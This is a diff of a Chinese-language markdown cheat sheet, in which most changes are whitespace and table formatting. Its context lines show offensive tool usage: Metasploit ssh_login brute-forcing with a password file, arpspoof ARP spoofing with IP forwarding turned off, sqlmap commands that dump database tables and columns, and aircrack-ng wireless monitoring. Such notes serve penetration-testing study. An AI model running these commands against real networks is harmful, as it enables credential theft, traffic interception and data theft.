@@ -76,8 +76,6 @@ Microsoft Windows [�汾 6.1.7601]
 
 show options 
 
-
-
 ## ssh_login
 
 ```bash
@@ -95,10 +93,6 @@ set PASS_FILE /path/to/pass_dict
 vim password.txt
 ```
 
-
-
-
-
 # arpspoof
 
 [ARP欺骗工具arpspoof的用法](https://blog.csdn.net/who_im_i/article/details/120234324)
@@ -108,19 +102,19 @@ apt install -y dsniff ssldump
 ```
 
 设置是否为目标和主机转发流量，0为不转发
+
 ```bash
 echo 0 > /proc/sys/net/ipv4/ip_forward
 ```
 
 arp欺骗，需要指定相关网卡。
+
 ```bash
 arpspoof -i <eth0> -t <target> <host>
 # -i 指定特定的网卡
 # -t 目标IP
 # host 网关IP
 ```
-
-
 
 # sqlmap
 
@@ -136,8 +130,6 @@ sqlmap -u "url" --cookie="cookie" -D database -T table --columns
 sqlmap -u "url" --cookie="cookie" -D database -T table -C col1,col2 --dump
 ```
 
-
-
 # aircrack-ng
 
 查看无线网卡信息
@@ -145,23 +137,26 @@ sqlmap -u "url" --cookie="cookie" -D database -T table -C col1,col2 --dump
 ```bash
 airmon-ng
 ```
+
 开启网卡监听模式
 
 ```bash
 airmon-ng start wlan0
 ```
+
 使用airodump-ng 扫描信号
 
 ```bash
 airodump-ng wlan0mon
 ```
-|符号|意义|
-|------|------|
-| BSSID | AP端的MAC地址 |
-| PWR   | 信号强度，数字越小越好 |
+
+| 符号     | 意义                          |
+| ------ | --------------------------- |
+| BSSID  | AP端的MAC地址                   |
+| PWR    | 信号强度，数字越小越好                 |
 | \#Data | 对应的路由器的在线数据吞吐量，数字越大，数据上传量越大 |
-| CH | 对应路由器的所在频道 |
-| ESSID | 对应路由器的名称 |
+| CH     | 对应路由器的所在频道                  |
+| ESSID  | 对应路由器的名称                    |
 
 使用airodump-ng 监听指定目标频道
 
